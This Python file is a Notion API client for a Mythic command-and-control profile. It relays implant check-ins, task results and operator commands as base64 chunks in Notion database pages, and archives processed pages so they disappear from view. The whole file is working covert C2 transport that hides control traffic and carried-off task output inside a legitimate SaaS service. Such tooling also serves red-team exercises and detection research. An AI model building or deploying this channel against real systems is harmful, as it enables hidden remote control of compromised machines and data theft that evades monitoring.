"""
Notion API client for the Mythic C2 profile.

Communication model:
  - direction="in"  : agent -> server  (agent posts a checkin / task result)
  - direction="out" : server -> agent  (server posts a command for the agent)

Each message is a Notion database page.
The actual payload is stored as code blocks in the page body to avoid the
2000-char limit on database text properties and to support large task outputs.
"""

import base64
import logging
import uuid
from typing import Optional

import httpx

logger = logging.getLogger(__name__)

NOTION_API_BASE = "https://api.notion.com/v1"
NOTION_VERSION = "2022-06-28"

# Notion rich_text blocks are capped at 2000 chars; stay safely below.
CHUNK_SIZE = 1800


class NotionClient:
    def __init__(self, token: str, database_id: str):
        self.database_id = database_id
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Notion-Version": NOTION_VERSION,
            "Content-Type": "application/json",
        }

    # ------------------------------------------------------------------
    # Public helpers
    # ------------------------------------------------------------------

    async def create_message(self, agent_id: str, data: bytes, direction: str) -> str:
        """
        Create a new page in the Notion database carrying *data*.
        Returns the new page ID.
        """
        encoded = base64.b64encode(data).decode()
        chunks = [encoded[i : i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]

        # Each chunk becomes its own code block so we never exceed the per-block limit.
        children = [
            {
                "object": "block",
                "type": "code",
                "code": {
                    "language": "plain text",
                    "rich_text": [{"type": "text", "text": {"content": chunk}}],
                },
            }
            for chunk in chunks
        ]

        payload = {
            "parent": {"database_id": self.database_id},
            "properties": {
                "uuid": {
                    "title": [{"text": {"content": str(uuid.uuid4())}}]
                },
                "direction": {"select": {"name": direction}},
                "agent_id": {
                    "rich_text": [{"text": {"content": agent_id}}]
                },
                "processed": {"checkbox": False},
                "size": {"number": len(data)},
            },
            "children": children,
        }

        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{NOTION_API_BASE}/pages",
                headers=self.headers,
                json=payload,
                timeout=30.0,
            )
            resp.raise_for_status()
            return resp.json()["id"]

    async def query_pending(self, direction: str) -> list:
        """Return all unprocessed pages for the given direction, oldest first."""
        payload = {
            "filter": {
                "and": [
                    {"property": "direction", "select": {"equals": direction}},
                    {"property": "processed", "checkbox": {"equals": False}},
                ]
            },
            "sorts": [{"timestamp": "created_time", "direction": "ascending"}],
        }

        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{NOTION_API_BASE}/databases/{self.database_id}/query",
                headers=self.headers,
                json=payload,
                timeout=30.0,
            )
            resp.raise_for_status()
            return resp.json().get("results", [])

    async def read_message_data(self, page_id: str) -> bytes:
        """
        Reassemble the base64 payload stored in the page's code blocks
        and return it as UTF-8 bytes (the base64 string itself, not decoded).
        Mythic expects the raw base64 string at /agent_message, same format
        as what HTTP agents POST directly to the C2 endpoint.
        """
        async with httpx.AsyncClient() as client:
            resp = await client.get(
                f"{NOTION_API_BASE}/blocks/{page_id}/children",
                headers=self.headers,
                timeout=30.0,
            )
            resp.raise_for_status()
            blocks = resp.json().get("results", [])

        encoded = ""
        for block in blocks:
            if block.get("type") == "code":
                for rt in block["code"].get("rich_text", []):
                    encoded += rt["text"]["content"]

        return encoded.encode("utf-8")

    async def create_response_page(self, agent_id: str, raw_b64: bytes, direction: str) -> str:
        """
        Create a response page storing Mythic's raw base64 response directly —
        no additional encoding. Mythic returns base64(UUID + body) and the agent
        expects to read exactly that string from Notion.
        """
        raw_text = raw_b64.decode("utf-8", errors="replace").strip()
        chunks = [raw_text[i : i + CHUNK_SIZE] for i in range(0, len(raw_text), CHUNK_SIZE)]

        try:
            decoded_size = len(base64.b64decode(raw_text))
        except Exception:
            decoded_size = len(raw_text)

        children = [
            {
                "object": "block",
                "type": "code",
                "code": {
                    "language": "plain text",
                    "rich_text": [{"type": "text", "text": {"content": chunk}}],
                },
            }
            for chunk in chunks
        ]

        payload = {
            "parent": {"database_id": self.database_id},
            "properties": {
                "uuid": {
                    "title": [{"text": {"content": str(uuid.uuid4())}}]
                },
                "direction": {"select": {"name": direction}},
                "agent_id": {
                    "rich_text": [{"text": {"content": agent_id}}]
                },
                "processed": {"checkbox": False},
                "size": {"number": decoded_size},
            },
            "children": children,
        }

        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{NOTION_API_BASE}/pages",
                headers=self.headers,
                json=payload,
                timeout=30.0,
            )
            resp.raise_for_status()
            return resp.json()["id"]

    async def mark_processed(self, page_id: str) -> None:
        """Mark a page as processed and archive it so it disappears from the database view."""
        async with httpx.AsyncClient() as client:
            resp = await client.patch(
                f"{NOTION_API_BASE}/pages/{page_id}",
                headers=self.headers,
                json={
                    "properties": {"processed": {"checkbox": True}},
                    "archived": True,
                },
                timeout=30.0,
            )
            resp.raise_for_status()

    async def archive_page(self, page_id: str) -> None:
        """Archive a page without changing its properties."""
        async with httpx.AsyncClient() as client:
            resp = await client.patch(
                f"{NOTION_API_BASE}/pages/{page_id}",
                headers=self.headers,
                json={"archived": True},
                timeout=30.0,
            )
            resp.raise_for_status()

    async def query_processed_out(self) -> list:
        """Return all direction=out pages already marked processed by the agent."""
        payload = {
            "filter": {
                "and": [
                    {"property": "direction", "select": {"equals": "out"}},
                    {"property": "processed", "checkbox": {"equals": True}},
                ]
            },
        }
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{NOTION_API_BASE}/databases/{self.database_id}/query",
                headers=self.headers,
                json=payload,
                timeout=30.0,
            )
            resp.raise_for_status()
            return resp.json().get("results", [])

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def get_agent_id(page: dict) -> Optional[str]:
        """Extract the agent_id from a Notion page's properties."""
        rt = page.get("properties", {}).get("agent_id", {}).get("rich_text", [])
        return rt[0]["text"]["content"] if rt else None
